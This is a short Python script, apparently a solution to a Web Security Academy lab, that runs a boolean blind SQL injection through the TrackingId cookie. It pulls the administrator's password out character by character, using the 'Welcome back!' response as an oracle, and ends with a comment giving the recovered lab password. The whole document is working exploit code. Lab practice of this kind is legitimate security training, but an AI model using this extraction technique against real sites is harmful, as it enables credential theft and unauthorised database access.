import requests as rq
import string

url = "https://0a32000a0420e1a5c002e508005a0019.web-security-academy.net/"

leaked_data = list("")

while True:
	for ch in string.printable:
		position = len(leaked_data) + 1
		headers = {"Cookie" : f"TrackingId=G5M6wMVdwL5tck48' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{position},1) = '{ch}"}
		response = rq.get(url, headers=headers)

		if "Welcome back!" in response.text:
			leaked_data.append(ch)
			break
		print("".join(leaked_data) + ch)

#Password : h7hqxbgdsfkq38m54fts